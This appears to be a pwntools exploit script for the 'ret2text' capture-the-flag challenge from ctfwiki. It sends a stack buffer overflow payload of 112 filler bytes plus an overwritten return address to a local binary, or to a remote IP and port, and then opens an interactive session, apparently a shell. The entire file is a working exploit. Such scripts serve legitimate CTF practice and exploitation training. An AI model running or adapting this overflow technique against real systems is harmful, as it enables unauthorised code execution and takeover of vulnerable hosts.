from pwn import *

local = 1

if __name__ == "__main__":
    addr = '../../challenges/ctfwiki/ret2text'
    ip = '111.200.241.244:65037'
    r = None
    if not local:
        r = remote(ip.split(':')[0], int(ip.split(':')[1]))
    else:
        r = process([addr])

    payload = b'A' * 112 + p32(0x804863a)  # dynamic debug, cyclic 200 as input

    r.sendline(payload)

    r.interactive()
